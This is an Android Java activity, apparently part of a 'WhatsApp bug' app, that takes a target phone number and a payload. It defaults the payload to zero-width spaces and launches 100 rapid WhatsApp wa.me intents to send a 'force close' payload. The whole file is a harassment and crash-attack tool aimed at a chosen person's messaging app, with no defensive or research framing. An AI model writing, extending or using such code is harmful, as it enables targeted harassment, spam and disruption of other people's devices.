package com.nexuz.bug;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class ForceCloseActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_forceclose);
        EditText etNumber = findViewById(R.id.etNumberFc);
        EditText etPayload = findViewById(R.id.etPayload);
        Button start = findViewById(R.id.btnStartFc);
        start.setOnClickListener(v -> {
            String num = etNumber.getText().toString().trim();
            String payload = etPayload.getText().toString();
            if (num.isEmpty()) {
                Toast.makeText(this, "Nomor kosong", Toast.LENGTH_SHORT).show();
                return;
            }
            if (payload.isEmpty())
                payload = "\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200B";
            final String formatted = num.startsWith("62") ? num :
                    num.startsWith("0") ? "62" + num.substring(1) : num;
            final String text = payload;
            Handler h = new Handler(Looper.getMainLooper());
            for (int i = 0; i < 100; i++) {
                h.postDelayed(() -> {
                    try {
                        Intent wa = new Intent(Intent.ACTION_VIEW,
                                Uri.parse("https://wa.me/" + formatted + "?text=" + Uri.encode(text)));
                        wa.setPackage("com.whatsapp");
                        startActivity(wa);
                    } catch (Exception ignored) {}
                }, i * 80L);
            }
            Toast.makeText(this, "FC payload dikirim", Toast.LENGTH_SHORT).show();
        });
    }
}
